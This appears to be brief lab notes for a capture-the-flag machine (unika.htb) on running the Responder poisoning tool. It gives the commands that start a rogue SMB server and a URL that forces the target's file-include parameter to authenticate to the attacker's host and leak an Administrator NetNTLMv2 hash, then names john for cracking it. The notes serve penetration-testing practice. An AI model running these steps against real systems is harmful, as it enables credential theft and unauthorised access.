# Responder
﷽
* "Responder is a LLMNR, NBT-NS and MDNS poisoner, with built-in HTTP/SMB/MSSQL/FTP/LDAP rogue authentication server supporting NTLMv1/NTLMv2/LMv2, Extended Security NTLMSSP and Basic HTTP authentication."
## usage

* navigate to the directory it is in:
  * `cd ~/Responder/`

* verify it's set to listen to SMB requests:
  * `cat Responder.conf`

* start it with `python3`, using the `-I` flag to select the interface, and `-i` to select IP - eg.
  * `sudo python3 Responder.py -I tun0 -i 192.168.5.208` (note that the NI+IP can be checked by running `ifconfig`)
  * this starts the rogue SMB server

* now, visit the website and tell the server to include a resource from our rogue SMB server, eg.
  * `http://unika.htb/?page=//10.10.14.25/somefile`

* A NetNTLMv for the Administrator user should be received :)
* Use `john` to crack the hash

